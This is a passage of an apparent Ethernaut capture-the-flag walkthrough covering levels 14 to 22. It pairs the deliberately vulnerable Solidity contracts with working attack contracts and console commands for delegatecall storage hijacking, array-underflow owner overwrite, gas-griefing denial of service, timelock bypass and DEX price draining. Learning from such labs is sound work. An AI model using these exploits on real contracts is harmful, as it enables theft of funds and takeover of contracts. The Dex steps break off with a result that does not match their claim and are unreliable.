        //   - keeps lower 2 bytes (satisfies gate 3 part 3: == uint16(tx.origin))
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        // Brute-force the gas to satisfy gate 2: gasleft() % 8191 == 0
        // We try 500 offsets around a multiplier of 8191
        // i = gas offset, total gas = 8191*3 + i
        for (uint256 i = 0; i < 500; i++) {
            (bool success, ) = address(_target).call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                break; // found the right gas offset, stop
            }
        }
    }
}
```

**1.** Deploy `GatekeeperOneAttack` on Remix (Injected Provider - MetaMask, Sepolia)

**2.** Call `attack` with your level's contract address → confirm in MetaMask

**3.** Verify:

```js
await contract.entrant() // should return your wallet address (tx.origin)
```
# 14 - Gatekeeper Two

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.
##### Things that might help:

- Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
- The `assembly` keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See [Solidity Assembly](http://solidity.readthedocs.io/en/v0.4.23/assembly.html) for more information. The `extcodesize` call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the [yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf).
- The `^` character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see [Solidity cheatsheet](http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet)). The Coin Flip level is also a good place to start when approaching this challenge.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
### Gate 1 — `msg.sender != tx.origin`

Identical to Gatekeeper One. Use an intermediary contract. 
## Gate 2 — `extcodesize(caller()) == 0`

`extcodesize(address)` returns the number of bytes of code at an address.

|Caller type|`extcodesize`|
|---|---|
|EOA (wallet)|`0`|
|Deployed contract|`> 0`|
|Contract **being constructed**|`0` ← the loophole|

During a contract's constructor execution, its bytecode **has not been written to the chain yet**. The EVM only stores the code after the constructor finishes. So during construction:

```c
extcodesize(address(this)) == 0   ← even though we're a contract!
```

```c
Deploy AttackContract
└── constructor() begins
    │   ← extcodesize is 0 HERE
    └── calls GatekeeperTwo.enter()
        └── gate 2 checks extcodesize → 0 
└── constructor finishes
└── bytecode now stored on-chain (too late to check)
```

So we put the entire attack inside the **constructor**. No separate `attack()` function needed.
## Gate 3 — XOR Inverse

The condition:

```c
uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
```

Simplified:

```c
A ^ key == 0xFFFFFFFFFFFFFFFF
```

`type(uint64).max` = `0xFFFFFFFFFFFFFFFF` = all 64 bits set to `1`

```
A bit    key bit    XOR result
  0         1           1  
  1         0           1  
```

For every bit of the result to be `1`, every bit of `key` must be the **opposite** of `A`. That means:

```c
key = ~A    (bitwise NOT of A)
```

Which is identical to:

```
key = A ^ 0xFFFFFFFFFFFFFFFF
```

Since `msg.sender` inside the call is `address(this)` (the attack contract), and we already know our own address during the constructor, we can compute `A` and derive `key` directly.

```bash
A ^ key = 0xFFFF...FFFF
      ↓ XOR both sides with A
key = A ^ 0xFFFF...FFFF
key = ~A
```

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwoAttack {

    constructor(address _target) {
        // compute A from our own address
        uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));

        // key = bitwise NOT of A → A ^ (~A) = 0xFFFFFFFFFFFFFFFF 
        bytes8 key = bytes8(~a);

        // fire from constructor:
        // gate 1: msg.sender = this contract ≠ tx.origin 
        // gate 2: extcodesize(this) = 0 still 
        // gate 3: key derived correctly 
        _target.call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}
```

Deploy `GatekeeperTwoAttack` on Remix with the level address as constructor arg. Attack will fire automatically once you deploy.

To verify:

```js
await contract.entrant()
```
# 15 - Naught Coin

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

  Things that might help

- The [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) Spec
- The [OpenZeppelin](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts) codebase

```c 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

NaughtCoin gives you 1,000,000 ERC20 tokens but tries to prevent you from moving them for 10 years via a `lockTokens` modifier on the `transfer()` function. The goal is to drain your balance to 0 without waiting.

ERC20 is a **token standard** on Ethereum — a set of rules that every fungible token must follow so wallets, exchanges, and protocols can interact with them uniformly. Think of it like a contract interface agreement.

The standard defines these core functions:

```c
balanceOf(address)           → how many tokens someone holds
transfer(to, amount)         → send tokens directly
approve(spender, amount)     → authorize someone else to spend your tokens
transferFrom(from, to, amount) → spend tokens on someone's behalf
allowance(owner, spender)    → check how much a spender is approved for
```

**There are two separate ways to move tokens in ERC20**, not one.

Path 1 — Direct transfer:

```bash
You → call transfer(recipient, amount)
```

You move tokens yourself, directly.

Path 2 — Delegated transfer (approve + transferFrom):

```bash
Step 1: You → call approve(spender, amount)
Step 2: Spender → call transferFrom(you, recipient, amount)
```

You authorize someone else (or yourself from another context) to pull tokens from your account. This is how DEXes, lending protocols, and staking contracts work — you approve them once, then they pull when needed.

Consider using Uniswap. You can't "push" tokens into a smart contract and have it know what to do — the contract needs to pull them during a transaction. So the flow is:

```bash
1. You approve(UniswapRouter, 1000 USDC)
2. You call swap() on Uniswap
3. Inside swap(), it calls transferFrom(you, pool, 1000 USDC)
```

This pattern is everywhere in DeFi. It's a foundational ERC20 mechanic.

In our case, NaughtCoin inherits from OpenZeppelin's `ERC20.sol`:

```c
contract NaughtCoin is ERC20 {
```

This gives NaughtCoin **all** ERC20 functions for free. The developer then overrides `transfer()` to add the timelock:

```c
function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
    super.transfer(_to, _value);
}
```

The `override` keyword replaces the parent's `transfer()` with this new version. But **only `transfer()` was overridden.** `transferFrom()`, `approve()`, and everything else is still the raw, unmodified OpenZeppelin implementation — no timelock, no restrictions.

```c
modifier lockTokens() {
    if (msg.sender == player) {
        require(block.timestamp > timeLock); // blocks for 10 years
        _;
    } else {
        _;
    }
}
```

This only runs when applied. It was applied to `transfer()`. It was **never applied** to `transferFrom()`. So the timelock only blocks one of the two transfer paths.

```
transfer()      → overridden → lockTokens applied → BLOCKED for 10 years
transferFrom()  → inherited  → no modifier        → OPEN right now
```

Since `transferFrom()` is inherited directly from OpenZeppelin ERC20 with no customization, calling it bypasses the timelock entirely. You can approve yourself as a spender and drain your own balance immediately.

Step 1: Check your token balance

```js
const balance = await contract.balanceOf(player)
console.log(balance.toString())
// 1000000000000000000000000 (1M tokens with 18 decimals)
```

Step 2: Approve yourself to spend your entire balance

```js
await contract.approve(player, balance)
```

This sets `allowance[player][player] = balance`. You are now authorized to call `transferFrom` on your own tokens.

Step 3: Verify the allowance was set

```c
(await contract.allowance(player, player)).toString()
// should match your balance
```

Step 4: Call `transferFrom` to move all tokens — bypassing the timelock

```js
await contract.transferFrom(player, contract.address, balance)
```

You can send to any address — another wallet, the contract itself, a burn address. The destination doesn't matter for completing the level.

Step 5: Verify your balance is zero

```js
(await contract.balanceOf(player)).toString()
// "0"
```
# 16 - Preservation

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

- Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
- Understanding what it means for `delegatecall` to be context-preserving.
- Understanding how storage variables are stored and accessed.
- Understanding how casting works between different data types.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

The `Preservation` contract:

1. Stores addresses of two library contracts (`timeZone1Library`, `timeZone2Library`)
2. Has an `owner` variable and a `storedTime` variable
3. Provides `setFirstTime()` and `setSecondTime()` functions that use `delegatecall` to invoke `setTime(uint256)` on the libraries

The `LibraryContract` is simple — it just has a `storedTime` variable and a `setTime()` function that writes to it.

Look at the storage layout of both contracts:

**Preservation storage slots:**

```c
slot 0 → timeZone1Library (address)
slot 1 → timeZone2Library (address)
slot 2 → owner (address)
slot 3 → storedTime (uint256)
```

**LibraryContract storage slots:**

```c
slot 0 → storedTime (uint256)
```

When `LibraryContract.setTime(uint256 _time)` executes via `delegatecall`:

- It writes `_time` to **slot 0** of the calling contract's storage
- But in `Preservation`, **slot 0 is `timeZone1Library`**, not `storedTime`!

```c
function setFirstTime(uint256 _timeStamp) public {
    timeZone1Library.delegatecall(
        abi.encodePacked(setTimeSignature, _timeStamp)
    );
}
```

When `LibraryContract.setTime()` runs via `delegatecall`, it writes to:

```c
slot 0
```

But in **Preservation**, slot 0 is:

```c
timeZone1Library
```

That means calling `setFirstTime()` overwrites the library address itself.

If we deploy a **malicious library contract** with a `setTime(uint256)` function that writes to **slot 2**, then when `Preservation` delegatecalls it:

- The malicious code runs in Preservation's storage context
- Writing to slot 2 overwrites the `owner` variable
- We can set `owner = msg.sender` (our attack contract) or directly to our wallet address

Deploy this in Remix:

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {

    // must match Preservation's layout exactly
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner;            // slot 2

    function setTime(uint256) public {
        // overwrite slot 2 (owner)
        owner = msg.sender;
    }
}
```

In console, Overwrite library pointer:

```js
await contract.setFirstTime("ATTACK_CONTRACT_ADDRESS")
```

Trigger delegatecall into malicious contract:

```js
await contract.setFirstTime(0)
```

Now `owner = msg.sender` inside delegatecall.

Since you called from your wallet:

```
owner = your wallet
```

```c
await contract.owner()
```

To prevent this attack:

1. **Use `staticcall` for read-only library calls** when possible
2. **Ensure library contracts have no state variables** that could collide (use `pure`/`view` functions)
3. **Use OpenZeppelin's `Address` library** with proper checks
4. **Avoid storing library addresses in mutable state** if they're only used for delegatecall
5. **Implement access controls** on functions that trigger delegatecall.
# 17 - Recovery

A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent `0.001` ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the `0.001` ether from the lost contract address.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

When a contract creates another contract using:

```bash
new SimpleToken(...)
```

The new contract’s address is **deterministically computed** from:

```bash
keccak256( RLP(sender_address, sender_nonce) )
```

Where:

- `sender_address` = address of the contract doing the creation (Recovery)
- `sender_nonce` = how many contracts that address has created

For contracts:

- The nonce starts at **1**
- The first contract created uses nonce = 1

In this level:

- Only one token was created
- So nonce = 1

So the lost contract address is:

```
address = keccak256( RLP(Recovery_address, 1) )[last 20 bytes]
```

This means we can compute it off-chain. Ethereum uses **RLP (Recursive Length Prefix)** encoding internally when computing addresses.

For:

```
(sender_address, nonce)
```

When nonce = 1, the RLP encoding is:

```bash
0xd6 0x94 <20-byte address> 0x01
```

So the address becomes:

```bash
keccak256( 0xd6 0x94 <Recovery_address> 0x01 )
```

Then take the **last 20 bytes**.

```js
// Get recovery contract address
const recoveryAddress = contract.address

// Compute lost token address
const lostAddress = web3.utils.toChecksumAddress(
  "0x" +
  web3.utils.keccak256(
    "0xd694" +
    recoveryAddress.slice(2) +
    "01"
  ).slice(-40)
)

lostAddress
```

Now that we have `lostAddress`, we call this to destroy it:

```js
const abi = [{
  "inputs": [{"internalType":"address payable","name":"_to","type":"address"}],
  "name":"destroy",
  "outputs":[],
  "stateMutability":"nonpayable",
  "type":"function"
}]

const lost = new web3.eth.Contract(abi, lostAddress)

await lost.methods.destroy(player).send({ from: player })
```

This will:

`selfdestruct(player)`

And send the `0.001 ETH` to your wallet.
# 18 - MagicNumber

To solve this level, you only need to provide the Ethernaut with a `Solver`, a contract that responds to `whatIsTheMeaningOfLife()` with the right 32 byte number.

Easy right? Well... there's a catch.

The solver's code needs to be really tiny. Really reaaaaaallly tiny. Like freakin' really really itty-bitty tiny: 10 bytes at most.

Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That's right: Raw EVM bytecode.

Good luck!

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum {
    address public solver;

    constructor() {}

    function setSolver(address _solver) public {
        solver = _solver;
    }

    /*
    ____________/\\\_______/\\\\\\\\\_____
     __________/\\\\\_____/\\\///////\\\___
      ________/\\\/\\\____\///______\//\\\__
       ______/\\\/\/\\\______________/\\\/___
        ____/\\\/__\/\\\___________/\\\//_____
         __/\\\\\\\\\\\\\\\\_____/\\\//________
          _\///////////\\\//____/\\\/___________
           ___________\/\\\_____/\\\\\\\\\\\\\\\_
            ___________\///_____\///////////////__
    */
}
```

Every deployed contract has two parts:
### Creation Code

Runs once during deployment.
Its job is to **return the runtime code**.
### Runtime Code

Lives on-chain permanently.
This is what executes when someone calls the contract.

The 10-byte limit applies to:

```c
RUNTIME CODE ONLY
```

Creation code can be longer.

It must respond to:

```
whatIsTheMeaningOfLife()
```

But here’s the trick:

The level does **not check the function selector**.

It simply performs a call and checks:

```c
Does the call return 42 as a 32-byte value?
```

So we don’t need a real function.

We just need:

```c
Return 42 no matter what.
```

To return 42:

We must:

1. Put `42` in memory
2. Return 32 bytes

Minimal opcode sequence:

|Opcode|Meaning|
|---|---|
|`PUSH1 0x2a`|push 42|
|`PUSH1 0x00`|memory position|
|`MSTORE`|store 42 at memory[0]|
|`PUSH1 0x20`|length = 32 bytes|
|`PUSH1 0x00`|offset = 0|
|`RETURN`|return memory|

```c
60 2a     // PUSH1 0x2a
60 00     // PUSH1 0x00
52        // MSTORE
60 20     // PUSH1 0x20
60 00     // PUSH1 0x00
f3        // RETURN
```

Final runtime bytecode:

```bash
0x602a60005260206000f3
```

```bash
60 2a (2)
60 00 (2)
52     (1)
60 20 (2)
60 00 (2)
f3     (1)
--------------
= 10 bytes
```

The EVM does not deploy runtime code directly.
We must write creation code that:

```bash
1. Places runtime bytecode in memory
2. Returns it
```

Use this known working full deployable bytecode:

```bash
0x600a600c600039600a6000f3602a60005260206000f3
```

First half (creation):

`600a600c600039600a6000f3`

Second half (runtime):

`602a60005260206000f3`

```js
await web3.eth.sendTransaction({
  from: player,
  data: "0x600a600c600039600a6000f3602a60005260206000f3"
})
```

We get:

```
Console was cleared. main.a339a761.chunk.js:1:25306
MagicNumber main.a339a761.chunk.js:1:18435687
Type help() for a listing of custom web3 addons main.a339a761.chunk.js:1:18437051
=> Level address
0x2132C7bc11De7A90B87375f282d36100a29f97a9 main.a339a761.chunk.js:1:18434997
await web3.eth.sendTransaction({
  from: player,
  data: "0x600a600c600039600a6000f3602a60005260206000f3"
})
Object { blockHash: "0xc4cbda7e803b2239f8222c5dd5224ccbc5b2110143918338ffcdd70c5a61b780", blockNumber: 10373613, contractAddress: "0x61153a3bF659aE1F011c80c0C09c21E5747E13e4", cumulativeGasUsed: 55330, effectiveGasPrice: 2500000010, from: "0x2009315ad9f3dbcd4041d256cb16d77d90ff95b9", gasUsed: 55330, logs: [], logsBloom: "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000", status: true, … }
```

Verify it returns 42 now:

```js
await web3.eth.call({
  to: "0x61153a3bF659aE1F011c80c0C09c21E5747E13e4"
})
```

```
await web3.eth.call({ to: "0x61153a3bF659aE1F011c80c0C09c21E5747E13e4" })

"0x000000000000000000000000000000000000000000000000000000000000002a"
```

Nice `2a` is `42`.

Now tell the level contract to use it.

```js
await contract.setSolver("0x61153a3bF659aE1F011c80c0C09c21E5747E13e4")
```

Submit.
# 19 - Alien Codex

You've uncovered an Alien contract. Claim ownership to complete the level.

  Things that might help

- Understanding how array storage works
- Understanding [ABI specifications](https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html)
- Using a very `underhanded` approach

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

This level is about:

1. **Storage layout**
2. **Dynamic array storage math**
3. **Underflow (Solidity 0.5 — no SafeMath on arrays)**

The vulnerability is here:

```c
function retract() public contacted {
    codex.length--;
}
```

In Solidity `^0.5.0`, this can underflow.

AlienCodex inherits from `Ownable`.

From `Ownable-05.sol`, storage is:

```c
address public owner;
```

So storage layout becomes:

```c
slot 0 → owner (20 bytes) + contact (1 byte packed)
slot 1 → codex.length
slot keccak256(1) → codex[0]
slot keccak256(1) + 1 → codex[1]
...
```

- `owner` and `contact` share **slot 0** (packing)
- `codex.length` is at **slot 1**
- The array data starts at:

```c
keccak256(1)
```

Initially: `codex.length = 0`

When we call:

```c
retract()
```

It does:

`codex.length--`

Since it's already 0:

`0 - 1 → 2^256 - 1`

Now the array length becomes:

`MAX_UINT256`

Meaning:

The array now covers ALL storage slots.

Array element location formula:

```c
codex[i] is stored at:
keccak256(slot_of_array) + i
```

Here:

```c
slot_of_array = 1
```

So:

```c
codex[i] → keccak256(1) + i
```

If we pick `i` cleverly, we can make:

```c
keccak256(1) + i = 0
```

And 0 slot contains owner. If we can write to `codex[i]` that maps to slot 0,
we overwrite the owner.

We want:

```c
keccak256(1) + i ≡ 0 (mod 2^256)
```

So:

```c
i = 2^256 - keccak256(1)
```

In JS console. Enable the contract:

```js
await contract.makeContact()
```

Now underflow the array:

```js
await contract.retract()
```

Now `codex.length = 2^256 - 1`

Compute index that maps to slot 0:

```js
let slot = web3.utils.keccak256(
  web3.eth.abi.encodeParameters(['uint256'], ['1'])
)

let index = web3.utils.toBN('2').pow(web3.utils.toBN('256'))
  .sub(web3.utils.toBN(slot))
  .toString()
```

We need to write your address as `bytes32`.

```js
await contract.revise(
  index,
  web3.utils.padLeft(player, 64)
)
```

This writes to slot 0 i.e owner.

```js
await contract.owner()
```
# 20 - Denial

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

Look carefully at `withdraw()`:

```c
function withdraw() public {
    uint256 amountToSend = address(this).balance / 100;

    partner.call{value: amountToSend}("");

    payable(owner).transfer(amountToSend);

    timeLastWithdrawn = block.timestamp;
    withdrawPartnerBalances[partner] += amountToSend;
}
```

Critical line:

```c
partner.call{value: amountToSend}("");
```

- Uses **low-level call**
- Forwards **ALL remaining gas**
- Does NOT limit gas
- Does NOT check return value

When `withdraw()` is called:

1. It sends ETH to `partner`
2. That executes partner’s `receive()` or `fallback()`
3. That partner gets **all available gas**

If partner:

- Consumes ALL gas
- Or enters infinite loop
- Or reverts in a specific way

Then execution never reaches:

```c
payable(owner).transfer(amountToSend);
```

And the transaction fails.

We:

1. Deploy a malicious contract
2. Set it as withdraw partner
3. Make its fallback consume all gas

When owner calls `withdraw()`:

- Gas gets drained
- `transfer()` never executes
- Tx fails
- Owner cannot withdraw

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    fallback() external payable {
        while(true) {}
    }
}
```

That infinite loop:

```c
while(true) {}
```

Consumes all gas.

Because `.call()` forwards all gas.

After deploying.

```c
await contract.setWithdrawPartner("0xATTACKADDRESS")
```

Now Submit.
# 21 - Shop

Сan you get the item from the shop for less than the price asked?
##### Things that might help:

- `Shop` expects to be used from a `Buyer`
- Understanding restrictions of view functions

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

```c
function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
        isSold = true;
        price = _buyer.price();
    }
}
```

Notice something subtle:

```c
_buyer.price()
```

is called **twice**.

And `price()` is:

```c
function price() external view returns (uint256);
```

It’s marked `view`  but that does **NOT** mean:

- It returns the same value every time
- It cannot read state
- It cannot react to changes in `Shop`

It only means:

-  It cannot modify state.

It can absolutely return different values depending on conditions.

Flow:

1. First `_buyer.price()` is used in the `if` check
2. `isSold` becomes true
3. `_buyer.price()` is called again
4. That value becomes the final `price`

So if we can:

- Return **100** the first time
- Return **0** the second time

We win.

We build a contract that:

- Implements `IBuyer`
- When `isSold == false` → return 100
- When `isSold == true` → return 0

Inside our `price()` function, we can read:

`Shop(msg.sender).isSold()`

Because when `Shop.buy()` calls us:

`msg.sender == Shop`

So we can inspect the Shop's state.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RawBuyer {

    address public target;

    constructor(address _shop) {
        target = _shop;
    }

    // this will be called by Shop
    function price() external view returns (uint256) {
        // Use a low-level staticcall to check Shop's isSold state
        (bool success, bytes memory data) = target.staticcall(
            abi.encodeWithSignature("isSold()")
        );
        require(success, "Failed to read isSold");

        bool sold = abi.decode(data, (bool));

        if (sold) {
            return 0;   // second call → buy cheap
        } else {
            return 100; // first call → meets requirement
        }
    }

    // attack helper
    function attack() external {
        // raw call to buy()
        (bool success, ) = target.call(abi.encodeWithSignature("buy()"));
        require(success, "Buy failed");
    }
}
```

Deploy above in Remix and use Instance address as shop address. Then call attack.

```js
await contract.price()
// Should return 0
```

```js
await contract.isSold()
// Should return true
```

Submit.
# 22 - Dex

The goal of this level is for you to hack the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_exchange) contract below and steal the funds by price manipulation.

You will start with 10 tokens of `token1` and 10 of `token2`. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
### Quick note

Normally, when you make a swap with an ERC20 token, you have to `approve` the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the `approve` method to the contract itself. So feel free to use `contract.approve(contract.address, <uint amount>)` instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the `SwappableToken` contract otherwise.

  Things that might help:

- How is the price of the token calculated?
- How does the `swap` method work?
- How do you `approve` a transaction of an ERC20?
- Theres more than one way to interact with a contract!
- Remix might help
- What does "At Address" do?

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

Look at the pricing formula:

```c
function getSwapPrice(address from, address to, uint256 amount)
    public
    view
    returns (uint256)
{
    return ((amount * IERC20(to).balanceOf(address(this)))
            / IERC20(from).balanceOf(address(this)));
}
```

Price is calculated as:

```c
amount * (DEX_to_balance / DEX_from_balance)
```

This is NOT constant-product (like Uniswap).

It’s just a simple ratio.

This makes it manipulatable.

You:

```
token1: 10
token2: 10
```

DEX:

```
token1: 100
token2: 100
```

Because price depends on current DEX balances:

If you:

- Swap all your token1 for token2
- Then swap all token2 for token1
- Repeat…

You skew the ratio more each time.

Eventually one side drains completely.

```js
await contract.approve(contract.address, 1000)
```

```js
let t1 = await contract.token1()
let t2 = await contract.token2()
```

```js
await contract.swap(t1, t2, 10)
```

```js
await contract.swap(t2, t1, 20)
```

```js
await contract.swap(t1, t2, 24)
```

```js
await contract.swap(t2, t1, 30)
```

```js
await contract.swap(t1, t2, 41)
```

```js
await contract.swap(t2, t1, 45)
```

```js
await contract.swap(t1, t2, 65)
```

Drain:

```js
await contract.swap(t2, t1, 110)
```

Check:

```js
await contract.balanceOf(t1, contract.address)
await contract.balanceOf(t2, contract.address)
```

One of them should be zero. Which means you have drained it so submit.

```js
let t1 = await contract.token1()
let t2 = await contract.token2()
"0xe7fDabE528D21f4A008CC7B479798A0FD521CC98"
(await contract.balanceOf(t1, contract.address)).toString()
"106"
